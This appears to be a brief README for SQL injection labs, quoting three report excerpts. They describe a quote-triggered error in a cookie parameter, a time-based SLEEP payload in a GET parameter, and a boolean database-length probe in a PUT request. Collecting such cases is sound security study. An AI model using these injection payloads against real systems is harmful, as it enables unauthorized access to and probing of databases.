
##  sql-injection labs 

![sql](https://github.com/user-attachments/assets/2a6f7be0-9e42-4dcc-a1f7-c83e7adf9aec)

## report #761304
It seams one of the parameters in the cookies is vulnerable to SQL injection. Below requests has the lang parameter in cookies. If you inject one quote mark like '. You get SQL error with the syntax. By injecting a second you have the error removed.

## report #1042746
 SQLI Injection Time Based on The parameter $_GET['acctid'] is vulnerable.
 GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1

## report #1044716
SQL Injection in request is used to create sales lead with the data the sales lead id is produced
PUT /consumer/onboarding/saleslead/6b6a8a5a-4a74-46db-b2fe-32a46f927ecc" AND (length(database())) = "11 --+- HTTP/1.1

